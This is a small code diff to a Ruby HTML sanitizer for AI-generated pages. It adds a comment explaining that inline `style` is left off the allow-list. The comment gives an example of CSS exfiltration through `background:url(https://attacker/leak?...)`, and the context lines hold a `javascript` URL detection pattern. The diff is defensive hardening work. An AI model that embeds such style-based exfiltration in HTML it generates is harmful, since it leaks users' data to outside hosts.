@@ -37,6 +37,11 @@ class Ai::PageSanitizer
     /url\s*\(\s*['"]*javascript/i,
   ].freeze
 
+  # `style` is intentionally NOT allow-listed. Inline styles can exfiltrate data
+  # via `background:url(https://attacker/leak?...)` from any non-sandboxed render
+  # context (admin previews, emails, etc.). The public viewer renders inside a
+  # sandboxed iframe today, but defense-in-depth: AI-generated HTML should use
+  # class-based styling (Tailwind utility classes), not inline `style`.
   def self.sanitize(html)
     return "" if html.blank?
 
